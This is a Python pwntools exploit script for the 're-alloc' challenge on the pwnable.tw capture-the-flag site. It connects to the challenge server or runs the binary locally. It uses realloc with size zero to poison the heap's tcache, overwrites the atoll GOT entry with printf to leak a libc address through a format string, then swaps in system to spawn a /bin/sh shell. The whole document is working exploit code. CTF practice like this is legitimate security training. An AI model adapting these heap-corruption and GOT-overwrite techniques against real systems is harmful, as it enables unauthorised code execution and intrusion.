from pwn import *

e = ELF("./re-alloc")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10106)
else:
  p = process(e.path)

def alloc(idx, size, data="A" * 8):
  p.sendline("1")
  p.sendlineafter(":", str(idx))
  p.sendlineafter(":", str(size))
  p.sendafter(":", data)

  p.recvuntil("choice:")

def free(idx):
  p.sendline("3")
  p.sendlineafter(":", str(idx))

  p.recvuntil("choice:")

def realloc(idx, size, data="A" * 8):
  p.sendline("2")
  p.sendlineafter(":", str(idx))
  p.sendlineafter(":", str(size))

  if size != 0:
    p.sendafter(":", data)

  p.recvuntil("choice:")

p.recvuntil("choice:")

alloc(0, 0x20)
realloc(0, 0)
realloc(0, 0x30, p64(e.got["atoll"] - 1))

alloc(1, 0x20)

free(0)
realloc(1, 0x40)
free(1)

alloc(1, 0x20, "\x00" + p64(e.symbols["printf"]) + p64(0) + p64(e.symbols["read_long"]))

p.sendline("2")
p.sendlineafter("Index:", "%3$llx")


leak = int(p.recvline(), 16) - 0x7f447aff4009 + 0x00007f447aec6000

print("{:#x}".format(leak)) 

p.sendlineafter("choice:", "2")
p.sendlineafter(":", "")
p.sendlineafter(":", "A" * 8)
p.sendlineafter("A" * 8, "%" + str(e.got["atoll"] - 5) + "x")
p.sendlineafter("Data:", p64(leak + libc.symbols["system"]))

p.sendlineafter("choice:", "1")
p.sendlineafter(":", "/bin/sh")

p.interactive()
